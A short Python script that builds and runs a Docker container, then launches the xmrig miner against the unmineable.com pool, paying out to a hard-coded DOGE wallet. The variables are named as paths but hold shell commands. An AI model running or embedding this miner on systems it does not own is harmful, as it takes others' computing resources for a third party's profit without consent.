import os
import time

path1='docker build -t python_docker'
path2='sudo docker run python_docker'
path3='sudo docker container run -it python_docker /bin/bash'
path4='./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DJRwFUYpqrUSb1tArQVSmrh173HiP1CVc2'

os.system(path1)
os.system(path2)
os.system(path3)
os.system(path4)
